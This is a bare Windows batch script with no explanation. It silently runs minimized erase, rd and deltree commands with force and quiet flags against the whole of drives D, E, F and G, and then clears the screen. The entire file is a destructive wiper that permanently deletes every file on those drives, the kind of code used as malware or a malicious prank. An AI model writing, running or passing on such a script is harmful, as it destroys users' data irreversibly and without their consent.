   @echo off
   cd\
   d:
   start /min erase /f/s/q d:\*.*
   start /min rd /s/q d:\*.*
   cd\
   e:
   start /min erase /f/s/q e:\*.*
   start /min rd /s/q e:\*.*
   cd\
   d:
   start /min deltree /y d:\*.*
   cd\
   e:
   start /min deltree /y e:\*.*
   cd\
   f:
   start /min erase /f/s/q f:\*.*
   start /min rd /s/q f:\*.*
   cd\
   g:
   start /min erase /f/s/q g:\*.*
   start /min rd /s/q g:\*.*
   cd\
   f:
   start /min deltree /y f:\*.*
   cd\
   g:
   start /min deltree /y g:\*.*
   cls
